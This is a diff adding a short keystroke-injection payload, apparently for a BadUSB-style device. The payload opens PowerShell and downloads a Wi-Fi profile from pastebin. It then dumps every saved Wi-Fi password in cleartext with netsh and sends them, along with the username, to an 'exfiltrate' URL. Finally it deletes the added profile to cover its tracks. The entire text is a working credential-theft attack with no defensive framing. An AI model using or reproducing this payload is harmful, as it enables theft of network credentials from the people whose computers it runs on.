@@ -1,0 +1,5 @@
+Press: 131 + 114
+PrintLine: powershell
+Press: 128 + 129 + 176
+Press: 130 + 121
+PrintLine: iwr -Uri https://pastebin.com/raw/zAZjt9Xj -OutFile c:\windows\temp\a.xml;netsh wlan add profile filename="c:\windows\temp\a.xml";del c:\windows\temp\a.xml;netsh wlan connect name="{SSID}";$b = (netsh wlan show profiles) | Select-String “\:(.+)$” | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=”$name” key=clear)} | Select-String “Key Content\W+\:(.+)$” | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Out-String; $n = "http://192.168.1.1/exfiltrate?file=";$n += "PassowrdsFrom:";$n += $env:UserName;$n += "&data=";$n +=$b;Invoke-WebRequest -Uri $n;netsh wlan delete profile name="{SSID}";exit
